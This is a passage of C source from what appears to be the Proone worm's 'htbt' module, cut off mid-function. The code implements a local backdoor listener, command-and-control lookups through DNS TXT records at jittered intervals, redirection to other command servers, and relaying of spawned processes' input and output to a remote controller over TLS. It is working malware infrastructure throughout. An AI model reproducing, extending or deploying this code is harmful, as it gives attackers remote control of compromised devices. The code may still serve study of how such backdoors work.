/*
* Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#include "htbt.h"
#include "config.h"
#include "util_rt.h"
#include "protocol.h"
#include "llist.h"
#include "pth.h"
#include "endian.h"
#include "mbedtls.h"
#include "iobuf.h"

#include <string.h>
#include <errno.h>
#include <inttypes.h>

#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ioctl.h>

#include <mbedtls/base64.h>


#define HTBT_MAIN_REQ_Q_SIZE	2
// Hover Max Redirection count
#define HTBT_HOVER_MAX_REDIR	5
// CNCP interval: HTBT_CNCP_INT_MIN + jitter
// between 30 minutes and an hour
#define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
#define HTBT_CNCP_INT_JIT	1800000 // half an hour jitter
#define HTBT_LBD_PORT			prne_htobe16((uint16_t)PRNE_HTBT_PROTO_PORT)
#define HTBT_LBD_BACKLOG		4
#define HTBT_LBD_MAX_CLIENTS	5

// CNCP TXT Record Data Transfer Timeout
static const struct timespec HTBT_CNCP_STREAM_TIMEOUT = { 1800, 0 }; // 30m
// Slave Socket Operation Timeout
static const struct timespec HTBT_SLV_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
// LBD Socket Bind Retry Interval
static const struct timespec HTBT_LBD_BIND_INT = { 5, 0 }; // 5s
// TLS Close Timeout
static const struct timespec HTBT_CLOSE_TIMEOUT = { 3, 0 }; // 3s
// Relay child Timeout
static const struct timespec HTBT_RELAY_CHILD_TIMEOUT = { 60, 0 }; // 60s
static const struct timespec HTBT_CHILD_WAIT_INT = { 1, 0 }; // 1s
static const struct timespec HTBT_CHILD_SPAWN_TIMEOUT = { 30, 0 }; // 30s
// Download tick timeout
static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s

static const size_t HTBT_STDIO_IB_SIZE[] = {
#if !PRNE_USE_MIN_MEM
	PRNE_HTBT_STDIO_LEN_MAX,
#endif
	512,
	0
};

#define HTBT_NT_MAIN "htbt_main"
#define HTBT_NT_LBD "htbt_lbd"
#define HTBT_NT_CNCP "htbt_cncp"
#define HTBT_NT_SLV "htbt_slv"

typedef uint_fast8_t htbt_lmk_t;
#define HTBT_LMK_NONE		0
// #define HTBT_LMK_HOVER		1
#define HTBT_LMK_UPBIN		2

typedef struct {
	int fd[2];
	void *ioctx;
	bool (*loopchk_f)(void *ioctx);
	bool (*setup_f)(void *ioctx, pth_event_t ev);
	void (*cleanup_f)(void *ioctx, pth_event_t ev);
	ssize_t (*read_f)(void *ioctx, void *buf, const size_t len);
	ssize_t (*write_f)(void *ioctx, const void *buf, const size_t len);
	bool (*pending_f)(void *ioctx);
	void (*hover_f)(
		void *ioctx,
		const prne_htbt_hover_t *hv,
		prne_htbt_status_code_t *status,
		int32_t *err);
	bool (*lm_acquire_f)(void *ioctx, const htbt_lmk_t v);
	void (*lm_release_f)(void *ioctx, const htbt_lmk_t v);
	const prne_htbt_cbset_t *cbset;
	void *cb_ctx;
	const prne_rcb_param_t *rcb;
	prne_iobuf_t iobuf[2];
	prne_pth_cv_t cv;
} htbt_slv_ctx_t;

typedef struct {
	prne_htbt_t *parent;
	pth_t pth;
	int fd[2];
	htbt_slv_ctx_t slv;
} htbt_cncp_client_t;

typedef struct {
	pth_t pth;
	prne_htbt_t *parent;
	htbt_slv_ctx_t slv;
	mbedtls_ssl_context ssl;
	int fd;
} htbt_lbd_client_t;

typedef struct {
	prne_htbt_t *parent;
	prne_llist_entry_t *hv_trace;
	htbt_slv_ctx_t slv;
	mbedtls_ssl_context ssl;
	int fd;
	bool hv_used;
} htbt_main_client_t;

typedef struct {
	prne_htbt_op_t op;
	void *body;
	prne_htbt_free_ft free_f;
} htbt_req_slip_t;

typedef struct {
	prne_htbt_t *parent;
	prne_llist_entry_t *trace;
	prne_htbt_hover_t msg;
} htbt_hv_req_body_t;

struct prne_htbt {
	prne_htbt_param_t param;
	pth_mutex_t lock;
	pth_cond_t cond;
	bool loop_flag;
	struct { // Lock Matrix
		pth_mutex_t lock;
		htbt_lmk_t m;
	} lock_m;
	struct { // Main
		// Request queue for HOVER
		prne_llist_t req_q;
		// HOVER tracers to enforce HTBT_HOVER_MAX_REDIR
		prne_llist_t hover_req;
		pth_mutex_t lock;
		pth_cond_t cond;
	} main;
	struct { // CNC DNS Record Probe
		char txtrec[256];
		pth_t pth;
		pth_mutex_t lock;
		pth_cond_t cond;
	} cncp;
	struct { // Local Backdoor
		pth_t pth;
		prne_llist_t conn_list;
		int fd;
	} lbd;
};

#define HTBT_INTP_CTX(x) prne_htbt_t *ctx = (prne_htbt_t*)(x);

static void htbt_init_req_slip (htbt_req_slip_t *s) {
	prne_memzero(s, sizeof(htbt_req_slip_t));
}

static void htbt_free_req_slip (htbt_req_slip_t *s) {
	if (s == NULL) {
		return;
	}

	if (s->free_f != NULL) {
		s->free_f(s->body);
	}
	prne_free(s->body);
}

static void htbt_mv_req_slip (htbt_req_slip_t *a, htbt_req_slip_t *b) {
	htbt_free_req_slip(b);
	memcpy(b, a, sizeof(htbt_req_slip_t));
	prne_memzero(a, sizeof(htbt_req_slip_t));
}

static bool htbt_lm_acquire (prne_htbt_t *ctx, const htbt_lmk_t v) {
	bool ret;

	prne_dbgtrap(pth_mutex_acquire(&ctx->lock_m.lock, FALSE, NULL));
	if ((ctx->lock_m.m & v) == 0) {
		ctx->lock_m.m |= v;
		ret = true;
	}
	else {
		ret = false;
	}
	pth_mutex_release(&ctx->lock_m.lock);

	return ret;
}

static void htbt_lm_release (prne_htbt_t *ctx, const htbt_lmk_t v) {
	prne_dbgtrap(pth_mutex_acquire(&ctx->lock_m.lock, FALSE, NULL));
	ctx->lock_m.m &= ~v;
	pth_mutex_release(&ctx->lock_m.lock);
}

static bool htbt_main_q_req_slip (prne_htbt_t *ctx, htbt_req_slip_t *in) {
	bool alloc = false, ret = false;
	htbt_req_slip_t *ny_slip = (htbt_req_slip_t*)prne_malloc(
		sizeof(htbt_req_slip_t),
		1);

	if (ny_slip == NULL) {
		goto END;
	}
	htbt_init_req_slip(ny_slip);

	prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
	if (ctx->main.req_q.size < HTBT_MAIN_REQ_Q_SIZE) {
		alloc =
			prne_llist_append(
				&ctx->main.req_q,
				(prne_llist_element_t)ny_slip) != NULL;
		if (alloc) {
			prne_dbgtrap(pth_cond_notify(&ctx->main.cond, FALSE));
		}
	}
	else {
		errno = EAGAIN;
	}
	pth_mutex_release(&ctx->main.lock);
	if (alloc) {
		htbt_mv_req_slip(in, ny_slip);
		ny_slip = NULL;
	}
	else {
		goto END;
	}

	ret = true;
END:
	htbt_free_req_slip(ny_slip);
	prne_free(ny_slip);

	return ret;
}

static void htbt_init_hv_req_body (htbt_hv_req_body_t *p) {
	p->parent = NULL;
	p->trace = NULL;
	prne_htbt_init_hover(&p->msg);
}

static void htbt_free_hv_req_body (htbt_hv_req_body_t *p) {
	if (p == NULL) {
		return;
	}

	prne_htbt_free_hover(&p->msg);
}

static bool htbt_main_q_hover (
	prne_htbt_t *ctx,
	const prne_htbt_hover_t *hv,
	prne_llist_entry_t *trace)
{
	bool ret = false;
	htbt_req_slip_t slip;
	htbt_hv_req_body_t *body;
	prne_llist_entry_t *ny_trace = NULL;

	htbt_init_req_slip(&slip);

	slip.free_f = (prne_htbt_free_ft)htbt_free_hv_req_body;
	slip.op = PRNE_HTBT_OP_HOVER;
	slip.body = prne_malloc(sizeof(htbt_hv_req_body_t), 1);
	body = (htbt_hv_req_body_t*)slip.body;
	if (body == NULL) {
		goto END;
	}
	htbt_init_hv_req_body(body);
	body->parent = ctx;
	if (trace == NULL) {
		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
		ny_trace = prne_llist_append(&ctx->main.hover_req, 1);
		pth_mutex_release(&ctx->main.lock);
		if (ny_trace == NULL) {
			goto END;
		}

		body->trace = ny_trace;
	}
	else {
		body->trace = trace;
	}

	if (!prne_htbt_cp_hover(hv, &body->msg) ||
		!htbt_main_q_req_slip(ctx, &slip))
	{
		goto END;
	}

	ny_trace = NULL;
	ret = true;
END:
	if (ny_trace != NULL) {
		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
		prne_llist_erase(&ctx->main.hover_req, ny_trace);
		pth_mutex_release(&ctx->main.lock);
	}
	htbt_free_req_slip(&slip);
	return ret;
}

static void htbt_main_empty_req_q (prne_htbt_t *ctx) {
	prne_llist_entry_t *ent;
	htbt_req_slip_t *s;

	ent = ctx->main.req_q.head;
	while (ent != NULL) {
		s = (htbt_req_slip_t*)ent->element;
		htbt_free_req_slip(s);
		prne_free(s);
		ent = ent->next;
	}
	prne_llist_clear(&ctx->main.req_q);
}

static void htbt_init_slv_ctx (htbt_slv_ctx_t *ctx) {
	prne_memzero(ctx, sizeof(htbt_slv_ctx_t));
	ctx->fd[0] = -1;
	ctx->fd[1] = -1;
	prne_init_iobuf(ctx->iobuf + 0);
	prne_init_iobuf(ctx->iobuf + 1);
}

static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
	if (ctx == NULL) {
		return;
	}
	prne_free_iobuf(ctx->iobuf + 0);
	prne_free_iobuf(ctx->iobuf + 1);
}

static bool htbt_alloc_slv_iobuf (htbt_slv_ctx_t *ctx) {
#define OPT_SIZE 2048
	static const size_t ALLOC_MAT[2][3] = {
		{
#if !PRNE_USE_MIN_MEM
			OPT_SIZE,
#endif
			PRNE_HTBT_PROTO_MIN_BUF,
			0
		},
		{
#if !PRNE_USE_MIN_MEM
			OPT_SIZE,
#endif
			PRNE_HTBT_PROTO_SUB_MIN_BUF,
			0
		}
	};
	prne_static_assert(
		OPT_SIZE >= PRNE_HTBT_PROTO_MIN_BUF &&
			OPT_SIZE >= PRNE_HTBT_PROTO_SUB_MIN_BUF,
		"Please reset OPT_SIZE.");
	return
		prne_try_alloc_iobuf(ctx->iobuf + 0, ALLOC_MAT[0]) &&
		prne_try_alloc_iobuf(ctx->iobuf + 1, ALLOC_MAT[1]);
#undef OPT_SIZE
}

static void htbt_slv_on_ioerr (htbt_slv_ctx_t *ctx, const bool w) {
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		char msg[256];
		const int saved_errno = errno;

		snprintf(
			msg,
			sizeof(msg),
			HTBT_NT_SLV"@%"PRIxPTR" %s",
			(uintptr_t)ctx,
			w ? "write" : "read");
		errno = saved_errno;
		prne_dbgperr(msg);
	}
}

static void htbt_slv_on_ioeof (htbt_slv_ctx_t *ctx, const bool w) {
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_SLV"@%"PRIuPTR": %s EOF\n",
			(uintptr_t)ctx,
			w ? "write" : "read");
	}
}

static void htbt_slv_on_io (
	htbt_slv_ctx_t *ctx,
	const bool w,
	const uint8_t *p,
	const size_t l)
{
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_SLV"@%"PRIuPTR": %s %zu bytes...\n",
			(uintptr_t)ctx,
			w ? ">" : "<",
			l);
		if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
			if (l == 0) {
				prne_dbgpf("\n");
			}
			else {
				for (size_t i = 0; i < l; ) {
					for (size_t j = 0; j < 24 && i < l; i += 1, j += 1) {
						prne_dbgpf("%02"PRIx8" ", p[i]);
					}
					prne_dbgpf("\n");
				}
			}
		}
	}
}

static void htbt_slv_on_mh (
	htbt_slv_ctx_t *ctx,
	const bool w,
	const prne_htbt_msg_head_t *mh)
{
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
#if PRNE_DEBUG
		const char *opstr = prne_htbt_op_tostr(mh->op);
#endif
		prne_dbgpf(
			HTBT_NT_SLV"@%"PRIuPTR": %s %"PRIX16"%s %s(%02x)\n",
			(uintptr_t)ctx,
			w ? ">" : "<",
			mh->id,
			mh->is_rsp ? "+" : " ",
			opstr != NULL ? opstr : "?",
			mh->op);
	}
}

static void htbt_slv_on_status (
	htbt_slv_ctx_t *ctx,
	const bool w,
	const prne_htbt_status_t *st)
{
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_SLV"@%"PRIuPTR": %s status code=%02x err=%x\n",
			(uintptr_t)ctx,
			w ? ">" : "<",
			st->code,
			st->err);
	}
}

static void htbt_slv_on_stdio (
	htbt_slv_ctx_t *ctx,
	const bool w,
	const prne_htbt_stdio_t *stdio)
{
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
		prne_dbgpf(
			HTBT_NT_SLV"@%"PRIuPTR": %s stdio err(%s) fin(%s) len=%zu\n",
			(uintptr_t)ctx,
			w ? ">" : "<",
			stdio->err ? "*" : " ",
			stdio->fin ? "*" : " ",
			stdio->len);
	}
}

static ssize_t htbt_slv_read (
	htbt_slv_ctx_t *ctx,
	void *buf,
	const size_t l,
	pth_event_t ev)
{
	ssize_t f_ret;
	struct pollfd pfd;

	while (true) {
		f_ret = ctx->read_f(ctx->ioctx, buf, l);
		if (f_ret > 0) {
			htbt_slv_on_io(ctx, 0, (const uint8_t*)buf, f_ret);
			break;
		}
		if (f_ret == 0) {
			htbt_slv_on_ioeof(ctx, 0);
			break;
		}
		if (!prne_is_nberr(errno)) {
			htbt_slv_on_ioerr(ctx, 0);
			return -1;
		}

		pfd.events = POLLIN;
		pfd.fd = ctx->fd[0];
		prne_pth_poll(&pfd, 1, -1, ev);
		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
			errno = ETIMEDOUT;
			return -1;
		}
	}

	return f_ret;
}

static bool htbt_slv_skip (
	htbt_slv_ctx_t *ctx,
	size_t l,
	pth_event_t ev)
{
	ssize_t f_ret;

	prne_iobuf_reset(ctx->iobuf + 0);
	while (l > 0) {
		f_ret = htbt_slv_read(
			ctx,
			ctx->iobuf[0].m,
			prne_op_min(ctx->iobuf[0].avail, l),
			ev);
		if (f_ret <= 0) {
			return false;
		}
		l -= f_ret;
	}

	return true;
}

static ssize_t htbt_slv_write (
	htbt_slv_ctx_t *ctx,
	const void *buf,
	const size_t l,
	pth_event_t ev)
{
	ssize_t f_ret;
	struct pollfd pfd;

	while (true) {
		f_ret = ctx->write_f(ctx->ioctx, buf, l);
		if (f_ret > 0) {
			htbt_slv_on_io(ctx, 1, (const uint8_t*)buf, f_ret);
			break;
		}
		if (f_ret == 0) {
			htbt_slv_on_ioeof(ctx, 1);
			break;
		}
		if (!prne_is_nberr(errno)) {
			htbt_slv_on_ioerr(ctx, 1);
			return -1;
		}

		pfd.events = POLLOUT;
		pfd.fd = ctx->fd[1];
		prne_pth_poll(&pfd, 1, -1, ev);
		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
			errno = ETIMEDOUT;
			return -1;
		}
	}

	return f_ret;
}

static bool htbt_slv_wflush (
	htbt_slv_ctx_t *ctx,
	const void *buf,
	size_t l,
	pth_event_t ev)
{
	ssize_t io_ret;
	const uint8_t *p = (const uint8_t*)buf;

	while (l > 0) {
		io_ret = htbt_slv_write(ctx, p, l, ev);
		if (io_ret <= 0) {
			return false;
		}
		l -= io_ret;
		p += io_ret;
	}

	return true;
}

static bool htbt_slv_wflush_ib (
	htbt_slv_ctx_t *ctx,
	prne_iobuf_t *ib,
	pth_event_t ev)
{
	const bool ret = htbt_slv_wflush(ctx, ib->m, ib->len, ev);
	if (ret) {
		prne_iobuf_reset(ib);
	}
	return ret;
}

static bool htbt_slv_send_frame (
	htbt_slv_ctx_t *ctx,
	const void *f,
	prne_htbt_ser_ft ser_f,
	pth_event_t ev)
{
	size_t actual;
	prne_htbt_ser_rc_t rc;

	prne_iobuf_reset(ctx->iobuf + 1);
	rc = ser_f(ctx->iobuf[1].m, ctx->iobuf[1].avail, &actual, f);
	switch (rc) {
	case PRNE_HTBT_SER_RC_OK: break;
	case PRNE_HTBT_SER_RC_MORE_BUF:
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
			prne_dbgpf(
				HTBT_NT_SLV"@%"PRIuPTR": send frame too large "
				"buf size=%zu actual=%zu\n",
				(uintptr_t)ctx,
				ctx->iobuf[1].size,
				actual);
		}
		return false;
	case PRNE_HTBT_SER_RC_ERRNO:
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
			char msg[256];
			const int saved_errno = errno;

			snprintf(
				msg,
				sizeof(msg),
				HTBT_NT_SLV"@%"PRIxPTR" send ser_f",
				(uintptr_t)ctx);
			errno = saved_errno;
			prne_dbgperr(msg);
		}
		return false;
	default:
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
			prne_dbgpf(
				HTBT_NT_SLV"@%"PRIuPTR": send ser_f returned %d\n",
				(uintptr_t)ctx,
				rc);
		}
		return false;
	}

	prne_iobuf_shift(ctx->iobuf + 1, actual);
	return htbt_slv_wflush_ib(ctx, ctx->iobuf + 1, ev);
}

static bool htbt_slv_send_mh (
	htbt_slv_ctx_t *ctx,
	const prne_htbt_msg_head_t *f,
	pth_event_t ev)
{
	htbt_slv_on_mh(ctx, 1, f);
	return htbt_slv_send_frame(
		ctx,
		f,
		(prne_htbt_ser_ft)prne_htbt_ser_msg_head,
		ev);
}

static bool htbt_slv_send_status (
	htbt_slv_ctx_t *ctx,
	const uint16_t *corr_id,
	const prne_htbt_status_code_t code,
	const int32_t err,
	pth_event_t ev)
{
	bool ret;
	prne_htbt_msg_head_t mh;
	prne_htbt_status_t st;

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_status(&st);

	mh.op = PRNE_HTBT_OP_STATUS;
	mh.is_rsp = true;
	if (corr_id != NULL) {
		mh.id = *corr_id;
	}
	st.code = code;
	st.err = err;

	htbt_slv_on_status(ctx, true, &st);
	ret =
		htbt_slv_send_mh(ctx, &mh, ev) &&
		htbt_slv_send_frame(
			ctx,
			&st,
			(prne_htbt_ser_ft)prne_htbt_ser_status,
			ev);

	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_status(&st);
	return ret;
}

static bool htbt_slv_send_stdio (
	htbt_slv_ctx_t *ctx,
	prne_htbt_stdio_t *stdio,
	pth_event_t ev)
{
	htbt_slv_on_stdio(ctx, true, stdio);
	return htbt_slv_send_frame(
		ctx,
		stdio,
		(prne_htbt_ser_ft)prne_htbt_ser_stdio,
		ev);
}

#define htbt_slv_raise_protoerr(ctx, corr_id, err, ev, ...) {\
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {\
		prne_dbgpf(\
			HTBT_NT_SLV"@%"PRIuPTR": protocol error - ",\
			(uintptr_t)ctx);\
		prne_dbgpf(__VA_ARGS__);\
		prne_dbgpf("\n");\
		htbt_slv_send_status(\
			ctx,\
			corr_id,\
			PRNE_HTBT_STATUS_PROTO_ERR,\
			err,\
			ev);\
	}\
}

static bool htbt_slv_recv_frame (
	htbt_slv_ctx_t *ctx,
	void *f,
	prne_htbt_dser_ft dser_f,
	const uint16_t *corr_id,
	const bool mid, // true if another frame is expected
	pth_event_t ev)
{
	prne_htbt_ser_rc_t rc;
	prne_htbt_status_code_t st_code = PRNE_HTBT_STATUS_OK;
	int32_t st_err = 0;
	size_t actual;
	ssize_t io_ret;

	prne_iobuf_reset(ctx->iobuf + 0);
	do {
		rc = dser_f(ctx->iobuf[0].m, ctx->iobuf[0].len, &actual, f);
		switch (rc) {
		case PRNE_HTBT_SER_RC_OK: return true;
		case PRNE_HTBT_SER_RC_MORE_BUF:
			prne_assert(ctx->iobuf[0].len < actual);

			if (ctx->iobuf[0].size < actual) {
				st_code = PRNE_HTBT_STATUS_ERRNO;
				st_err = ENOMEM;
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
					prne_dbgpf(
						HTBT_NT_SLV"@%"PRIuPTR": recv frame too large "
						"buf size=%zu actual=%zu\n",
						(uintptr_t)ctx,
						ctx->iobuf[0].size,
						actual);
				}
				break;
			}

			io_ret = htbt_slv_read(
				ctx,
				ctx->iobuf[0].m + ctx->iobuf[0].len,
				actual - ctx->iobuf[0].len,
				ev);
			if (!mid) {
				if (io_ret <= 0) {
					return false;
				}
			}
			if (io_ret < 0) {
				return false;
			}
			if (io_ret == 0) {
				st_code = PRNE_HTBT_STATUS_PROTO_ERR;
				break;
			}
			prne_iobuf_shift(ctx->iobuf + 0, io_ret);
			break;
		case PRNE_HTBT_SER_RC_FMT_ERR:
			st_code = PRNE_HTBT_STATUS_PROTO_ERR;
			break;
		case PRNE_HTBT_SER_RC_ERRNO:
			st_code = PRNE_HTBT_STATUS_ERRNO;
			st_err = errno;
			break;
		default:
			st_code = PRNE_HTBT_STATUS_ERRNO;
			break;
		}
	} while (st_code == PRNE_HTBT_STATUS_OK);

	htbt_slv_send_status(ctx, corr_id, st_code, st_err, ev);
	return false;
}

static bool htbt_slv_recv_mh (
	htbt_slv_ctx_t *ctx,
	prne_htbt_msg_head_t *mh,
	const uint16_t *corr_id,
	const bool mid,
	pth_event_t ev)
{
	static const uint16_t ERR_MSGID = PRNE_HTBT_MSG_ID_NOTIFY;
	bool ret = htbt_slv_recv_frame(
		ctx,
		mh,
		(prne_htbt_dser_ft)prne_htbt_dser_msg_head,
		&ERR_MSGID,
		mid,
		ev);

	if (ret) {
		htbt_slv_on_mh(ctx, 0, mh);
		if (mh->op != PRNE_HTBT_OP_NOOP && mh->is_rsp) {
			// Slave context received a response frame?
			// this a protocol error
			htbt_slv_raise_protoerr(
				ctx,
				&mh->id,
				0,
				ev,
				"received response mh");
			ret = false;
		}
		if (corr_id != NULL && *corr_id != mh->id) {
			htbt_slv_raise_protoerr(
				ctx,
				&mh->id,
				0,
				ev,
				"msg id assertion fail");
			ret = false;
		}
	}

	return ret;
}

static bool htbt_slv_recv_stdio (
	htbt_slv_ctx_t *ctx,
	prne_htbt_stdio_t *stdio,
	const uint16_t *corr_id,
	pth_event_t ev)
{
	const bool ret = htbt_slv_recv_frame(
		ctx,
		stdio,
		(prne_htbt_dser_ft)prne_htbt_dser_stdio,
		corr_id,
		true,
		ev);

	if (ret) {
		htbt_slv_on_stdio(ctx, false, stdio);
	}

	return ret;
}

static bool htbt_slv_srv_noop (htbt_slv_ctx_t *ctx) {
	bool ret;
	prne_htbt_msg_head_t mh;
	pth_event_t ev = NULL;

	prne_htbt_init_msg_head(&mh);
	mh.op = PRNE_HTBT_OP_NOOP;
	mh.is_rsp = true;

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret = htbt_slv_send_mh(ctx, &mh, ev);

	prne_htbt_free_msg_head(&mh);
	pth_event_free(ev, FALSE);
	return ret;
}

static bool htbt_relay_child_evconn (
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	prne_htbt_msg_head_t *mh,
	prne_htbt_stdio_t *stdio,
	int *c_in,
	prne_iobuf_t *ib,
	pth_event_t *ev)
{
	ssize_t io_ret;

	if (stdio->len == 0) {
		prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
		if (!htbt_slv_recv_mh(ctx, mh, &msg_id, true, *ev)) {
			return false;
		}

		switch (mh->op) {
		case PRNE_HTBT_OP_NOOP: return htbt_slv_srv_noop(ctx);
		case PRNE_HTBT_OP_STDIO: break;
		default:
			htbt_slv_raise_protoerr(
				ctx,
				&mh->id,
				0,
				*ev,
				"%02X: invalid op relaying child",
				mh->op);
			return false;
		}

		if (!htbt_slv_recv_stdio(ctx, stdio, &msg_id, *ev)) {
			return false;
		}
		if (stdio->err) {
			htbt_slv_raise_protoerr(
				ctx,
				&msg_id,
				0,
				*ev,
				"received stdio frame with err bit set");
			return false;
		}
	}

	if (stdio->len > 0) {
		io_ret = htbt_slv_read(
			ctx,
			ib->m + ib->len,
			prne_op_min(ib->avail, stdio->len),
			NULL);
		if (io_ret <= 0) {
			return false;
		}

		prne_iobuf_shift(ib, io_ret);
		stdio->len -= io_ret;
		// when stdio->len reaches zero here, c_in will be closed on the next
		// iteration.
	}
	else if (/* stdio->len == 0 && */stdio->fin) {
		// when stdio with zero len and fin set received.
		prne_close(*c_in);
		*c_in = -1;
	}

	return true;
}

static bool htbt_relay_child_evflush (
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	const prne_htbt_stdio_t *stdio,
	int *c_in,
	prne_iobuf_t *ib,
	pth_event_t *ev)
{
	ssize_t io_ret;

	io_ret = write(*c_in, ib->m, ib->len);
	if (io_ret <= 0) {
		if (io_ret == 0) {
			/* this shouldn't happen as c_in is pipe!
			* just being defensive here in case some other author makes a
			* mistake
			*/
			errno = EPIPE;
		}
		// It's up to authoritive end to decide if they should raise SIGPIPE
		prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
		htbt_slv_send_status(
			ctx,
			&msg_id,
			PRNE_HTBT_STATUS_ERRNO,
			errno,
			*ev);
		return false;
	}
	prne_iobuf_shift(ib, -io_ret);

	if (ib->len == 0 && stdio->len == 0 && stdio->fin) {
		prne_close(*c_in);
		*c_in = -1;
	}

	return true;
}

static bool htbt_relay_child_evchld (
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	const pid_t *c_pid,
	prne_htbt_msg_head_t *mh,
	prne_htbt_stdio_t *stdio,
	int *c_out,
	int *c_err,
	prne_iobuf_t *ib,
	pth_event_t *ev)
{
	/*
	* - Read from the stdout/stderr.
	* - send fin if EOF
	* - flush data
	* - on error: close stdout and stderr and send SIGPIPE to the child
	*/
	int *const c_arr[] = { c_out, c_err, NULL };
	ssize_t io_ret;
	bool ret = false;

	mh->id = msg_id;
	mh->is_rsp = true;
	mh->op = PRNE_HTBT_OP_STDIO;

	for (size_t i = 0; c_arr[i] != NULL; i += 1) {
		int *const c = c_arr[i];

		if (*c < 0) {
			continue;
		}
		stdio->err = c == c_err;

		io_ret = read(*c, ib->m, ib->avail);
		if (io_ret < 0) {
			if (prne_is_nberr(errno)) {
				continue;
			}
			prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
			htbt_slv_send_status(
				ctx,
				&msg_id,
				PRNE_HTBT_STATUS_ERRNO,
				errno,
				*ev);
			goto END;
		}
		if (io_ret == 0) {
			prne_close(*c);
			*c = -1;

			stdio->fin = true;
			stdio->len = 0;
			prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
			ret =
				htbt_slv_send_mh(ctx, mh, *ev) &&
				htbt_slv_send_stdio(ctx, stdio, *ev);
			if (!ret) {
				goto END;
			}
			continue;
		}
		prne_iobuf_shift(ib, io_ret);

		stdio->fin = false;
		stdio->len = io_ret;
		prne_pth_reset_timer(ev, &HTBT_SLV_SCK_OP_TIMEOUT);
		ret =
			htbt_slv_send_mh(ctx, mh, *ev) &&
			htbt_slv_send_stdio(ctx, stdio, *ev) &&
			htbt_slv_wflush_ib(ctx, ib, *ev);
		if (!ret) {
			goto END;
		}
	}
	ret = true;

END:
	if (!ret && ib->len > 0 && c_pid != NULL) {
		// there is unsent data. Notify the process.
		kill(*c_pid, SIGPIPE);
	}

	return ret;
}

/*
*
* Stdin data from the auth end is buffered and flushed when possible since
* the process might not be accepting stdin data at all. Stdout and stderr data
* are read from the process and sent to the auth end synchronously.
* The assumption that the connection is stable and the auth end is constantly
* consuming stdout/stderr data from the process.
*
* There's a chance of broken pipe case being silently ignored due to the nature
* of multiplexing using poll(). For example, if the auth end sends a stdio frame
* with len > 0 and fin set and the process closes its stdin with the data still
* in the pipe, a SIGPIPE will be sent but there's no way to associate th signal
* with the stdio pipes.
*/
static bool htbt_relay_child (
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	const pid_t *c_pid,
	int *c_in,
	int *c_out,
	int *c_err)
{
	bool ret = false;
	struct pollfd pfd[4];
	prne_htbt_msg_head_t mh;
	prne_htbt_stdio_t sh[2];
	prne_iobuf_t ib[2];
	pth_event_t ev = NULL;

	pfd[0].fd = ctx->fd[0];
	pfd[2].events = pfd[3].events = POLLIN;
	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_stdio(sh + 0);
	prne_htbt_init_stdio(sh + 1);
	prne_init_iobuf(ib + 0);
	prne_init_iobuf(ib + 1);

	if (!(prne_try_alloc_iobuf(ib + 0, HTBT_STDIO_IB_SIZE) &&
		prne_try_alloc_iobuf(ib + 1, HTBT_STDIO_IB_SIZE)))
	{
		goto END;
	}

	while (*c_out >= 0 || *c_err >= 0) {
		pth_yield(NULL);

		// Do poll
		pfd[1].fd = *c_in;
		pfd[2].fd = *c_out;
		pfd[3].fd = *c_err;
